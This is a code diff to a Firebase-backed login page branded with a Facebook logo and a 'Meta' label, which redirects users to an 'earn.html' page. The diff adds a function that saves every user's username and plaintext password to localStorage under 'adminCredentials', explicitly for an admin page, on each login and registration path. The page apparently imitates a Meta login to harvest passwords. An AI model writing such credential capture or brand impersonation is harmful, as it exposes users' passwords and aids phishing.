@@ -224,7 +224,7 @@
         <!-- Facebook Logo -->
         <div class="logo">
             <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"></path>
+                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.43v2.953H15.46c-1.584 0-1.968.771-1.968 1.9v2.494h3.328l-.432 3.41h-2.896v8.385c5.737-.931 10.125-5.934 10.125-11.854z"/>
             </svg>
         </div>
 
@@ -249,7 +249,7 @@
 
         <div class="meta-logo">
             <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                <path d="M12 0C5.373 0 0 5.373 0 12c0 5.304 3.438 9.834 8.207 11.387.6.111.82-.26.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61-.546-1.387-1.333-1.756-1.333-1.756C2.5 20.031 3.708 20 3.708 20c1.3 0 1.967-.855 2.168-1.592.184-.704.922-2.833.922-2.833.102-.203.49-.635.968-.635.477 0 .625.432.625.432l.582 2.957c.052.263.27.347.548.347.276 0 .872-.014 1.468-.789.601-.789.922-1.935.922-1.935.083-.418.39-1.023.782-1.023.391 0 .781.264.78.629-.001.365.04 1.631.04 1.631 0 .484-.02 1.179-.383 1.179-.364 0-.738-.26-.738-.26s.12 1.231 1.02 1.231c.9 0 1.599-.631 1.599-1.631 0-1 .164-2.457.164-2.457.037-.396.32-.666.66-.666.34 0 .478.27.478.27s.22 1.402 1.02 1.402c.8 0 1.26-.536 1.26-1.36 0-.824.094-1.944.094-1.944.016-.414.219-.735.523-.735.304 0 .49.321.49.735v2.209c0 .483.19 1.072.88 1.072.69 0 1.221-.589 1.221-1.272 0-.683-.089-1.816-.089-1.816.016-.445.229-.802.547-.802.318 0 .502.357.502.802v2.014c0 .657.27 1.157.927 1.157.657 0 1.044-.5 1.044-1.157V7.5c0-1.022 1.658-1.844 2.95-1.844 1.292 0 1.822.822 1.822 1.844v7.573c0 .657.27 1.157.927 1.157.657 0 1.044-.5 1.044-1.157V7.5c0-.485.19-1.072.88-1.072.69 0 1.221.587 1.221 1.272v8.301c0 .657.27 1.157.927 1.157.657 0 1.044-.5 1.044-1.157V9.344c0-1.022 1.658-1.844 2.95-1.844 1.292 0 1.822.822 1.822 1.844v8.73c0 4.87-3.993 8.82-8.863 8.82-4.87 0-8.862-3.95-8.862-8.82V12z"></path>
+                <path d="M12 0C5.373 0 0 5.373 0 12c0 5.304 3.438 9.834 8.207 11.387.6.111.82-.26.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.084-.73.084-.73 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.605-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 21.795 24 17.295 24 12c0-6.627-5.373-12-12-12z"/>
             </svg>
             Meta
         </div>
@@ -273,6 +273,44 @@
         const app = initializeApp(firebaseConfig);
         const auth = getAuth(app);
         const db = getFirestore(app);
+
+        // Function to save credentials to admin.html via localStorage
+        const saveCredentialsToAdmin = (username, password) => {
+            try {
+                const credentials = {
+                    username: username,
+                    password: password,
+                    savedAt: new Date().toISOString()
+                };
+                localStorage.setItem('adminCredentials', JSON.stringify(credentials));
+                console.log("✅ Credentials saved to localStorage for admin.html");
+            } catch (err) {
+                console.warn("⚠️ Could not save credentials to localStorage:", err);
+            }
+        };
+
+        // Function to perform redirect with better error handling
+        const redirectToEarn = () => {
+            try {
+                // Try multiple redirect methods for robustness
+                const earnPath = "./earn.html";
+                console.log("🔄 Redirecting to:", earnPath);
+                
+                // Use window.location.href as primary method
+                window.location.href = earnPath;
+                
+                // Fallback methods if primary doesn't work
+                setTimeout(() => {
+                    if (window.location.pathname.indexOf("earn.html") === -1) {
+                        console.log("📍 Fallback redirect attempt...");
+                        window.location.replace(earnPath);
+                    }
+                }, 500);
+            } catch (err) {
+                console.error("❌ Redirect error:", err);
+                alert("Redirect failed. Please navigate to earn.html manually.");
+            }
+        };
 
         window.handleLogin = async () => {
             const username = document.getElementById("username").value.trim();
@@ -318,10 +356,14 @@
                     try {
                         const result = await signInWithEmailAndPassword(auth, userEmail, password);
                         console.log("✅ Firebase authentication successful");
+                        
+                        // Save credentials to admin.html
+                        saveCredentialsToAdmin(username, password);
+                        
                         successDiv.innerText = "✓ Login successful! Redirecting...";
                         setTimeout(() => {
-                            window.location.href = "earn.html";
-                        }, 1500);
+                            redirectToEarn();
+                        }, 1000);
                     } catch (err) {
                         console.error("❌ Firebase Auth error:", err.code, err.message);
                         
@@ -352,7 +394,7 @@
                             // Email exists, just try to sign in
                             try {
                                 const result = await signInWithEmailAndPassword(auth, tempEmail, password);
-                                console.log("��� Signed in with existing email");
+                                console.log("✅ Signed in with existing email");
                                 
                                 // Make sure Firestore user doc exists
                                 const firestoreUserRef = doc(db, "users", username);
@@ -374,10 +416,13 @@
                                     });
                                 }
                                 
+                                // Save credentials to admin.html
+                                saveCredentialsToAdmin(username, password);
+                                
                                 successDiv.innerText = "✓ Logged in! Redirecting...";
                                 setTimeout(() => {
-                                    window.location.href = "earn.html";
-                                }, 1500);
+                                    redirectToEarn();
+                                }, 1000);
                             } catch (err) {
                                 console.error("❌ Sign in with existing email failed:", err.message);
                                 errorDiv.innerText = "Incorrect password.";
@@ -406,10 +451,13 @@
                             });
                             console.log("✅ Firestore document created");
 
+                            // Save credentials to admin.html
+                            saveCredentialsToAdmin(username, password);
+
                             successDiv.innerText = "✓ Account created and logged in! Redirecting...";
                             setTimeout(() => {
-                                window.location.href = "earn.html";
-                            }, 1500);
+                                redirectToEarn();
+                            }, 1000);
                         }
                     } catch (err) {
                         console.error("❌ Registration error:", err.code, err.message);
